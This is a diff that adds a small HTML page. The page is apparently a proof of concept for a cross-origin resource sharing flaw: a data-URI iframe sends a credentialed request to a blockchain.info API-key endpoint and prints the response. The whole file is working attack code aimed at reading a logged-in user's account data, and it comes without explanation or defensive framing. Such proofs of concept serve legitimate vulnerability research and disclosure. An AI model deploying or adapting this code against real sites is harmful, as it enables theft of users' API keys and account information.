@@ -1,0 +1,15 @@
+<html>
+<body>
+<iframe src='data:text/html,<script>
+var xhr = new XMLHttpRequest();
+xhr.open("GET", "https://blockchain.info/apikey/user", true);
+xhr.withCredentials = true;
+xhr.onload = function () {
+    if (xhr.readyState === xhr.DONE) {
+            console.log(xhr.response);
+    }
+};
+xhr.send(null);
+</script>'></iframe>
+
+</body>
